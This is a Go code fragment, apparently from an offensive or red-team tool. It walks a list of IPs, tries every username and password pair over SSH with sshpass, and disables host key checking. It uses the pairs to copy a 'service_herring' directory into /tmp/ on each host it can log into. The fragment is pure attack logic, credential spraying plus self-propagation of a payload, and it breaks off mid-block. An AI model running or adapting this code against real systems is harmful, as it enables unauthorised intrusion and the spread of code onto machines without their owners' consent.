		...
		if sshUp(ips[i]) {
			...
			for u := 0; u < len(usernames); u++ {
				...
				for p := 0; p < len(passwords); p++ {
					if isVerbose {
						command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../service_herring", usernames[u] + "@" + ips[i] + ":/tmp/"}
						fmt.Println(command)
					}
					cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../service_herring", usernames[u]+"@"+ips[i]+":/tmp/")
					err := cmd.Run()
					if err == nil {
						if isVerbose {
